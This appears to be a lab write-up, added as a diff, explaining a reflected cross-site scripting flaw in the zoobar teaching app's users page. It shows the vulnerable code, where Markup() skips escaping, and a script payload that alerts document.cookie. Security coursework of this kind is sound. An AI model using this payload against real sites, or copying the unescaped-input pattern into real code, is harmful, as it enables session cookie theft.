@@ -1,0 +1,33 @@
+The cross-site scripting vulnerability on /zoobar/index.cgi/users is:
+
+def users():
+    args = {}
+    args['req_user'] = Markup(request.args.get('user', ''))
+    if 'user' in request.values:
+              .....
+              .....
+    return render_template('users.html', **args)
+
+No matter the query argument "user" is valid or not, users.py will transfer 
+"user"'s value as an argument 'req_user' to users.html, and in users.html
+
+    <form name="profileform" method="GET">
+    <nobr>User:
+    <input type="text" name="user" value="{{ req_user }}" size=10></nobr><br>
+    <input type="submit" value="View">
+    </form>
+
+since user.py does not escape the submitted characters, so we can make req_user as:
+    "</input><script>alert(document.cookie);</script><input value="
+
+so users.html becomes:
+     <form name="profileform" method="GET">
+     <nobr>User:
+     <input type="text" name="user" value=""</input>
+     <script>alert(document.cookie);</script>
+     <input value="" size=10></nobr><br>
+     <input type="submit" value="View">
+     </form>
+
+when this user.html is sent back to browser, the embeded script will be executed,
+and it will print the victim's cookie
